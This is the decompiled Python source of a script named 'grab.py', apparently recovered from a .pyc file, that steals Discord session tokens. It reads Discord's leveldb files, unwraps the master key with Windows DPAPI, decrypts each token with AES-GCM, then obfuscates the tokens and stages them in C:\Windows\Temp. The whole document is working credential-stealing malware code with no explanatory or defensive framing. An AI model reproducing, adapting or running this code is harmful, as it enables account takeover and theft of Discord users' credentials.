# uncompyle6 version 3.9.1
# Python bytecode version base 3.4 (3310)
# Decompiled from: Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0]
# Embedded file name: grab.py
import os, re, base64, json, time
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
encrypted_regex = 'dQw4w9WgXcQ:[^\\"]*'
roaming = os.getenv("appdata")

def CryptEncrypt(data, key):
    key_bytes = key.encode("utf-8")
    encrypted_data = bytearray()
    for i in range(len(data)):
        encrypted_data.append(data[i] ^ key_bytes[i % len(key_bytes)])

    return encrypted_data


def encrypt_val_back(data, path, old):
    try:
        with open(path, "r", encoding="utf-8") as f:
            k = f.read()
        data_bytes = data.encode("utf-8")
        enc = CryptEncrypt(data=data_bytes, key=k)
        with open("C:\\Windows\\Temp\\" + old + ".bak", "wb") as output_file:
            output_file.write(enc)
        return "C:\\Windows\\Temp\\" + old + ".bak"
    except Exception as e:
        return "Failed to store: " + str(e)


def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Failed to decrypt password" + str(e)


def get_master_key(path):
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


for file_name in os.listdir(roaming + "\\discord\\Local Storage\\leveldb"):
    if file_name[-3:] not in ('log', 'ldb'):
        continue
    for line in [x.strip() for x in open(roaming + "\\discord\\Local Storage\\leveldb\\" + file_name, errors="ignore").readlines() if x.strip()]:
        for y in re.findall(encrypted_regex, line):
            try:
                token = decrypt_val(base64.b64decode(y.split("dQw4w9WgXcQ:")[1]), get_master_key(roaming + "\\discord\\Local State"))
                print(encrypt_val_back(token, roaming + "\\discord\\Local State", file_name))
                time.sleep(3)
            except ValueError:
                pass

# okay decompiling grab.pyc
